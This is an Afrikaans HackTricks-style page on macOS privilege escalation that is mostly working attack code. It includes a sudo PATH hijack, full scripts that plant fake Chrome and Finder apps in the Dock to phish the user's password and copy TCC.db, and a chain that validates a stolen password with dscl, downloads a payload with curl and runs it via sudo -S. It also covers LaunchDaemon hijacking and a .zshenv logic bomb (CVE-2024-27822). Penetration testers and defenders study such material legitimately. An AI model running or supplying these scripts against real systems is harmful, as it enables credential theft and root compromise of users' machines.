# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

As jy hierheen gekom het op soek na TCC privilege escalation, gaan na:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Baie privilege-escalation-tegnieke wat Linux- of ander Unix-agtige stelsels raak, is ook op macOS van toepassing. Sien:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## Gebruikersinteraksie

### Sudo Hijacking

Jy kan die oorspronklike [Sudo Hijacking-tegniek in die Linux Privilege Escalation-plasing vind](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

macOS **behou** egter die gebruiker se **`PATH`** wanneer hulle **`sudo`** uitvoer. Dit beteken dat ’n ander manier om hierdie aanval uit te voer, sou wees om ander binaries te **hijack** wat die slagoffer steeds uitvoer wanneer hulle **sudo gebruik:**

```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
    whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```

Let daarop dat 'n gebruiker wat die terminal gebruik heel waarskynlik **Homebrew geïnstalleer** sal hê. Dit is dus moontlik om binaries in **`/opt/homebrew/bin`** te kaap.

### Dock-voorplanting

Met behulp van 'n bietjie **social engineering** kan jy byvoorbeeld **Google Chrome** in die dock **voorgee** en eintlik jou eie script uitvoer:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
'n Paar voorstelle:

- Kyk in die Dock of daar Chrome is, en indien wel, **verwyder** daardie item en **voeg die** **vals** **Chrome-item op dieselfde posisie** in die Dock-skikking **by**.

<details>
<summary>Chrome Dock-voorplantingsscript</summary>

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /Applications/Google\\\\ Chrome.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Enkele voorstelle:

- Jy **kan Finder nie uit die Dock verwyder nie**, so as jy dit by die Dock gaan voeg, kan jy die vals Finder net langs die regte een plaas. Hiervoor moet jy **die vals Finder-inskrywing aan die begin van die Dock-skikking voeg**.
- Nog ’n opsie is om dit nie in die Dock te plaas nie, maar dit net oop te maak; “Finder wat Finder vra om beheer te neem” is nie so vreemd nie.
- Nog ’n opsie om **sonder ’n wagwoord na root te eskaleer** en ’n aaklige dialoogkassie te vermy, is om Finder werklik vir die wagwoord te laat vra om ’n bevoorregte handeling uit te voer:
  - Vra Finder om ’n nuwe **`sudo`**-lêer na **`/etc/pam.d`** te kopieer (Die versoek om die wagwoord sal aandui dat “Finder sudo wil kopieer”)
  - Vra Finder om ’n nuwe **Authorization Plugin** te kopieer (Jy kan die lêernaam beheer sodat die versoek om die wagwoord sal aandui dat “Finder Finder.bundle wil kopieer”)

<details>
<summary>Finder Dock-impersonation script</summary>

```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /System/Library/CoreServices/Finder.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Finder</string>
    <key>CFBundleIdentifier</key>
    <string>com.apple.finder</string>
    <key>CFBundleName</key>
    <string>Finder</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}
{{#endtabs}}

### Wagwoordprompt-phishing + sudo-hergebruik

Wanware misbruik dikwels gebruikersinteraksie om ’n **wagwoord vas te vang waarmee sudo gebruik kan word** en dit programmaties te hergebruik. ’n Algemene verloop:

1. Identifiseer die aangemelde gebruiker met `whoami`.
2. **Herhaal wagwoordprompts** totdat `dscl . -authonly "$user" "$pw"` suksesvol terugkeer.
3. Kas die aanmeldbesonderheid (bv. `/tmp/.pass`) en voer bevoorregte aksies uit met `sudo -S` (wagwoord via stdin).

Voorbeeld van ’n minimale ketting:

```bash
user=$(whoami)
while true; do
  read -s -p "Password: " pw; echo
  dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```

Die gesteelde wagwoord kan dan hergebruik word om Gatekeeper-quarantine met `xattr -c` **te clear**, LaunchDaemons of ander bevoorregte lêers te kopieer, en bykomende fases nie-interaktief uit te voer.<sup>[[1]](#references)</sup>

#### Valideer vasgevangde wagwoorde deur PAM

’n Veiligteksaanwysing wat inheems lyk, kan ’n kandidaat-rekeningwagwoord insamel en dit in die proses deur PAM valideer, eerder as om `dscl`, `security` of `osascript` te begin. Die oproeper begin ’n PAM-transaksie met `pam_start`, verskaf die kandidaat deur ’n gesprekterugroeping, roep `pam_authenticate` aan en sluit die transaksie met `pam_end`. ’n Mislukte kontrole kan terugkeer na die wagwoordveld; ’n suksesvolle kontrole bevestig die wagwoord sonder om ’n aparte verifikasieproses te begin. PAM-verifikasie alleen **verhoog nie** die oproeper se voorregte of magtig bevoorregte bewerkings nie.<sup>[[9]](#references)[[10]](#references)</sup>

As die aanmeld- en Sleutelhouer-wagwoorde ooreenstem, kan die vasgevangde wagwoord ook bruikbaar wees vir bewerkings wat die huidige Sleutelhouer-wagwoord vereis; sien [Sleutelhouer-ACL- en partisielysbeperkings](../macos-red-teaming/macos-keychain.md).<sup>[[10]](#references)</sup>

## Nuwer macOS-spesifieke vektore (2023–2026)

### Verouderde `AuthorizationExecuteWithPrivileges` is steeds bruikbaar

`AuthorizationExecuteWithPrivileges` is in 10.7 verouderd verklaar, maar **werk steeds op Sonoma/Sequoia**. Baie kommersiële opdateerders roep `/usr/libexec/security_authtrampoline` met ’n onbetroubare pad aan. As die teikenbinêr deur die gebruiker geskryf kan word, kan jy ’n trojaan plant en die wettige aanwysing benut:

```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```

Kombineer met die **masquerading-truuks hierbo** om ’n geloofwaardige wagwoorddialoog te vertoon.


### Triage van geprivilegieerde helpers / XPC

Baie moderne macOS-privescs van derde partye volg dieselfde patroon: ’n **root LaunchDaemon** stel ’n **Mach/XPC service** vanaf **`/Library/PrivilegedHelperTools`** beskikbaar, waarna die helper óf **nie die kliënt valideer nie**, dit **te laat** valideer (PID race), óf ’n **root method** blootstel wat ’n **user-controlled path/script** gebruik. Dit is die foutklas agter baie onlangse helper-foute in VPN-kliënte, game launchers en updaters.<sup>[[2]](#references)</sup>

Vinnige triage-kontrolelys:

```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
  echo "== $f =="
  codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
  strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```

Gee veral aandag aan helpers wat:

- aanhou om versoeke te aanvaar **ná verwydering** omdat die taak in `launchd` gelaai gebly het
- skrifte uitvoer of konfigurasie lees vanaf **`/Applications/...`** of ander paaie wat deur nie-root-gebruikers geskryf kan word
- op **PID-gebaseerde** of **slegs-bundle-id**-peervalidering staatmaak wat met 'n race condition uitgebuit kan word

Vir meer besonderhede oor helper-magtigingsfoute, kyk na [hierdie bladsy](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### PackageKit-omgewingsoorerwing vir skrifte (CVE-2024-27822)

Totdat Apple dit in **Sonoma 14.5**, **Ventura 13.6.7** en **Monterey 12.7.5** reggestel het, kon gebruiker-geïnisieerde installasies via **`Installer.app`** / **`PackageKit.framework`** **PKG-skrifte as root binne die huidige gebruiker se omgewing uitvoer**. Dit beteken dat 'n pakket wat **`#!/bin/zsh`** gebruik, die aanvaller se **`~/.zshenv`** sou laai en dit as **root** uitvoer wanneer die slagoffer die pakket installeer.<sup>[[3]](#references)</sup>

Dit is veral interessant as 'n **logic bomb**: jy het net 'n vastrapplek in die gebruiker se rekening en 'n skryfbare dopopstartlêer nodig, waarna jy wag totdat die gebruiker enige kwesbare **zsh-gebaseerde** installeerder uitvoer. Dit geld oor die algemeen **nie** vir **MDM/Munki**-ontplooiings nie, omdat dié binne die root-gebruiker se omgewing loop.<sup>[[3]](#references)</sup>

```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```

As jy die Installer-spesifieke misbruikscenario's dieper wil ondersoek, kyk ook na [hierdie bladsy](macos-files-folders-and-binaries/macos-installers-abuse.md).

### Installer-bestemmingsbotsing via `.localized`

Sommige derdeparty-installers registreer 'n root LaunchDaemon waarvan die uitvoerbare lêer met 'n vaste pad binne `/Applications/Target.app` verwys word. As 'n aanvaller daardie bundel eerste met 'n **ander bundle identifier** kan skep, kan Installer die lokmiddel behou en die werklike app by `/Applications/Target.localized/Target.app` plaas. Die daemon verwys steeds na die oorspronklike pad. Daarom kan 'n aanvallerbeheerde uitvoerbare lêer binne die lokmiddelbundel later as root loop.<sup>[[8]](#references)</sup>

Die belangrike voorvereistes is:<sup>[[8]](#references)</sup>

1. Die aanvaller kan die verwagte toepassingpad skep of beheer.
2. Die pakket verwyder nie die botsende bundel nie.
3. Die geprivilegieerde taak gebruik 'n hardgekodeerde pad binne daardie bundel.
4. Die gebruiker of 'n MDM-werkvloei installeer die pakket en registreer die taak.

Soek na verskuifde bundels en hersien dan die LaunchDaemon-teikens met die enumerasielus in die volgende afdeling:<sup>[[8]](#references)</sup>

```bash
find /Applications -type d -name '*.localized' -prune -print
for app in /Applications/*.app; do
  [ -d "$app" ] && stat -f '%Su:%Sg %Sp %N' "$app"
done
```

’n Veiliger installer bepaal die finale bundle-ligging en hou bevoorregte uitvoerbare lêers op ’n root-besitte plek soos `/Library/PrivilegedHelperTools`. Dit behoort ook eienaarskap en code signing te verifieer voordat dit die job registreer of begin.<sup>[[8]](#references)</sup>

### Kaping van ’n skryfbare LaunchDaemon-teiken

’n LaunchDaemon-plist kan root-besit wees terwyl sy `Program`-inskrywing of eerste `ProgramArguments`-inskrywing na ’n gebruiker-skryfbare gids wys. Gaan die **hele pad** na, nie net die uitvoerbare lêer se modus nie. As die ouergids skryfbaar is, kan ’n aanvaller ’n root-besitte uitvoerbare lêer hernoem en ’n vervanging op dieselfde pad skep. Die vervanging loop as root wanneer die job die volgende keer begin. ’n Herlaai of ’n gewone diensherbegin is genoeg. Die aanvaller het nie toestemming nodig om `launchctl bootstrap` in die system-domein uit te voer nie.<sup>[[7]](#references)</sup>

Lys eers elke teiken en sy onmiddellike ouergids:<sup>[[7]](#references)</sup>

```bash
for p in /Library/LaunchDaemons/*.plist; do
  target=$(plutil -extract Program raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] ||
    target=$(plutil -extract ProgramArguments.0 raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] || continue
  printf '\n%s -> %s\n' "$p" "$target"
  ls -ld "$target" "$(dirname "$target")" 2>/dev/null
done
```

Wanneer die lêer of sy ouergids skryfbaar is, behou die oorspronklike binêre lêer en vervang die pad met ’n uitvoerbare payload. Wag dan dat die reeds gelaaide daemon herbegin.<sup>[[7]](#references)</sup>

```bash
target=/path/from/the/plist
mv "$target" "$target.real"
cp /tmp/payload "$target"
chmod 755 "$target"
```

### XNU SMR credential-pointer race (CVE-2025-24118)

Die kwesbare `kauth_cred_proc_update`-pad het `proc_ro.p_ucred` met die nie-atomiese `zalloc_ro_mut`-API bygewerk, terwyl SMR-lesers die wyser sonder ’n slot gelaai het. Die openbare sneller gebruik ’n spesiaal voorbereide setgid-binêre lêer. Een draad wissel tussen sy werklike en effektiewe groep-ID’s, terwyl ’n ander draad herhaaldelik ’n stelseloproep soos `getgid()` uitvoer.<sup>[[4]](#references)</sup>

```c
// Writer thread inside a setgid binary
while (1) {
    setgid(real_gid);
    setgid(effective_gid);
}
// Reader thread
while (1) observed_gid = getgid();
```

Behandel dit as ’n **race primitive**, nie as ’n klaargemaakte root exploit nie. Die gepubliseerde PoC demonstreer ’n gedeeltelik geskryfde credential pointer. Dit eindig dikwels in ’n kernel panic. Die navorser het die korrupsie slegs op Intel gereproduseer en nie deterministiese beheer oor die gevolglike credential object gedemonstreer nie. Apple het die opdatering in macOS 15.3 na ’n atomiese pointer exchange verander.<sup>[[4]](#references)</sup>

### SIP-omseiling via Migration Assistant ("Migraine", CVE-2023-32369)

Selfs as jy reeds root het, blokkeer SIP skryfbewerkings na stelsel-liggings. Die **Migraine**-bug misbruik die Migration Assistant entitlement `com.apple.rootless.install.heritable` om ’n child process te begin wat die SIP-omseiling erf en beskermde paaie oorskryf (bv. `/System/Library/LaunchDaemons`).<sup>[[5]](#references)</sup> Die ketting:

1. Verkry root op ’n lopende stelsel.
2. Aktiveer `systemmigrationd` met ’n spesiaal saamgestelde toestand om ’n aanvaller-beheerde binary uit te voer.
3. Gebruik die geërfde entitlement om SIP-beskermde lêers te wysig; die veranderinge bly behoue selfs ná ’n herlaai.

### NSPredicate/XPC expression-smokkelary (CVE-2023-23530/23531-bugklas)

Verskeie Apple-daemons aanvaar **NSPredicate**-objects oor XPC en valideer slegs die `expressionType`-veld, wat deur ’n aanvaller beheer kan word. Deur ’n predicate saam te stel wat arbitrêre selectors evalueer, kan jy **code execution in root/system XPC-services** verkry (bv. `coreduetd`, `contextstored`). Wanneer dit met ’n aanvanklike app sandbox escape gekombineer word, bied dit **privilege escalation sonder gebruiker-aanwysings**. Soek XPC-endpoints wat predicates deserialiseer en nie ’n robuuste visitor het nie.<sup>[[6]](#references)</sup>

## TCC - Root-privilege-escalation

### CVE-2020-9771 - mount_apfs TCC-omseiling en privilege escalation

**Enige gebruiker** (selfs onbevoorregte gebruikers) kan ’n Time Machine snapshot met `-o noowners` skep en mount, en **TOEGANG tot AL die lêers** in daardie snapshot verkry. Dit omseil die eienaarskapkontroles op die live volume. Die enigste vereiste privilege is dat die gebruikte toepassing (soos `Terminal`) **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`) moet hê.

Die opdragte en volledige verduideliking is op die TCC-omseilingsbladsy:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Sensitiewe inligting

Dit kan nuttig wees om privileges te eskaleer:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}



{{#include ../../banners/hacktricks-training.md}}

## References

- [1] [Pentest Partners - 2025, die jaar van die Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: Plaaslike privilege escalation in AWS Client VPN vir macOS](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: macOS PackageKit-privilege-escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [TRAVERTINE: CVE-2025-24118](https://jprx.io/cve-2025-24118/)
- [5] [Microsoft "Migraine" SIP-omseiling (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - ’n Nuwe klas privilege-escalation-bugs op macOS en iOS (CVE-2023-23530/23531)](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
- [7] [LaunchDaemon-kaping: privilege escalation en persistence via onveilige vouertoestemmings](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
- [8] [macOS LPE via die .localized-gids](https://theevilbit.github.io/posts/localized/)
- [9] [Jamf Threat Labs - PamStealer: macOS-malware wat hom voordoen as ’n clipboard manager-app](https://www.jamf.com/blog/pamstealer-macos-infostealer-applescript-rust/)
- [10] [Kaspersky Securelist - MacSync onder die mikroskoop](https://securelist.com/macsync-new-version/121383/)
